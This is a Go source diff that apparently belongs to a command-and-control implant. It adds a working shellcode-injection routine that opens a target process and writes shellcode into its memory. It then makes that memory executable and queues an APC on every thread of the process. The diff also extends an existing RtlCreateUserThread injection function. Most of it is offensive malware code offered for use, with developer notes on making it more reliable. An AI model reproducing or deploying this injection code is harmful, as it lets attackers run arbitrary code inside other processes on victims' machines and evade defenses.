@@ -46,6 +46,11 @@ const (
 	PROCESS_VM_WRITE 		= 0x0020
 	PROCESS_VM_OPERATION 	= 0x0008
 	PROCESS_QUERY_INFORMATION = 0x0400
+	TH32CS_SNAPHEAPLIST		= 0x00000001
+	TH32CS_SNAPMODULE		= 0x00000008
+	TH32CS_SNAPPROCESS		= 0x00000002
+	TH32CS_SNAPTHREAD		= 0x00000004
+	THREAD_SET_CONTEXT 		= 0x0010
 )
 
 // ExecuteCommand is function used to instruct an agent to execute a command on the host operating system
@@ -229,6 +234,120 @@ func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
 		return errors.New("Error calling WaitForSingleObject:\r\n" + errWaitForSingleObject.Error())
 	}
 
+	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
+	if errCloseHandle.Error() != "The operation completed successfully." {
+		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
+	}
+
+	return nil
+}
+
+func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
+	// TODO this can be local or remote
+	kernel32 := windows.NewLazySystemDLL("kernel32")
+
+	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
+	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
+	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
+	CloseHandle := kernel32.NewProc("CloseHandle")
+	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
+	QueueUserAPC := kernel32.NewProc("QueueUserAPC")
+	Thread32First := kernel32.NewProc("Thread32First")
+	Thread32Next := kernel32.NewProc("Thread32Next")
+	OpenThread := kernel32.NewProc("OpenThread")
+
+	// Consider using NtQuerySystemInformation to replace CreateToolhelp32Snapshot AND to find a thread in a wait state
+	// https://stackoverflow.com/questions/22949725/how-to-get-thread-state-e-g-suspended-memory-cpu-usage-start-time-priori
+
+	pHandle, errOpenProcess := syscall.OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, false, pid)
+
+	if errOpenProcess != nil {
+		return errors.New("Error calling OpenProcess:\r\n" + errOpenProcess.Error())
+	}
+	// TODO see if you can use just SNAPTHREAD
+	sHandle, _, errCreateToolhelp32Snapshot := CreateToolhelp32Snapshot.Call(TH32CS_SNAPHEAPLIST|TH32CS_SNAPMODULE|TH32CS_SNAPPROCESS|TH32CS_SNAPTHREAD, uintptr(pid))
+	if errCreateToolhelp32Snapshot.Error() != "The operation completed successfully."{
+		return errors.New("Error calling CreateToolhelp32Snapshot:\r\n" + errCreateToolhelp32Snapshot.Error())
+	}
+
+	// TODO don't allocate/write memory unless there is a valid thread
+	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle),0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	if errVirtualAlloc.Error() != "The operation completed successfully."  {
+		return errors.New("Error calling VirtualAlloc:\r\n" + errVirtualAlloc.Error())
+	}
+
+	if addr == 0 {
+		return errors.New("VirtualAllocEx failed and returned 0")
+	}
+
+	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
+
+	if errWriteProcessMemory.Error() != "The operation completed successfully." {
+		return errors.New("Error calling WriteProcessMemory:\r\n" + errWriteProcessMemory.Error())
+	}
+
+	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), PAGE_EXECUTE)
+	if errVirtualProtectEx.Error() != "The operation completed successfully." {
+		return errors.New("Error calling VirtualProtectEx:\r\n" + errVirtualProtectEx.Error())
+	}
+
+	type THREADENTRY32 struct {
+		dwSize				uint32
+		cntUsage			uint32
+		th32ThreadID		uint32
+		th32OwnerProcessID	uint32
+		tpBasePri			int32
+		tpDeltaPri			int32
+		dwFlags				uint32
+	}
+	var t THREADENTRY32
+	t.dwSize = uint32(unsafe.Sizeof(t))
+
+	_, _, errThread32First := Thread32First.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
+	if errThread32First.Error() != "The operation completed successfully."{
+		return errors.New("Error calling Thread32First:\r\n" + errThread32First.Error())
+	} else {
+		i := true
+		x := 0
+		// Queue an APC for every thread; very unstable and not ideal, need to programmatically find alertable thread
+		for i {
+			_, _, errThread32Next := Thread32Next.Call(uintptr(sHandle), uintptr(unsafe.Pointer(&t)))
+			if errThread32Next.Error() == "There are no more files." {
+				if x == 1 {
+					// don't queue to main thread when using the "spray all threads" technique
+					// often crashes process
+					return errors.New("the process only has 1 thread; APC not queued")
+				}
+				i = false
+				break
+			} else if errThread32Next.Error() != "The operation completed successfully." {
+				return errors.New("Error calling Thread32Next:\r\n" + errThread32Next.Error())
+			}
+			if t.th32OwnerProcessID == pid {
+				if x > 0 {
+					tHandle, _, errOpenThread := OpenThread.Call(THREAD_SET_CONTEXT, 0, uintptr(t.th32ThreadID))
+					if errOpenThread.Error() != "The operation completed successfully." {
+						return errors.New("Error calling OpenThread:\r\n" + errOpenThread.Error())
+					} else {
+						// fmt.Println(fmt.Sprintf("Queueing APC for PID: %d, Thread %d", pid, t.th32ThreadID))
+						_, _, errQueueUserAPC := QueueUserAPC.Call(addr, tHandle, 0)
+						if errQueueUserAPC.Error() != "The operation completed successfully." {
+							return errors.New("Error calling QueueUserAPC:\r\n" + errQueueUserAPC.Error())
+						} else {
+							x++
+							_, _, errCloseHandle := CloseHandle.Call(tHandle)
+							if errCloseHandle.Error() != "The operation completed successfully." {
+								return errors.New("Error calling thread CloseHandle:\r\n" + errCloseHandle.Error())
+							}
+						}
+					}
+				} else {x++}
+			}
+
+		}
+	}
+	// TODO check process to make sure it didn't crash
 	_, _, errCloseHandle := CloseHandle.Call(uintptr(pHandle))
 	if errCloseHandle.Error() != "The operation completed successfully." {
 		return errors.New("Error calling CloseHandle:\r\n" + errCloseHandle.Error())
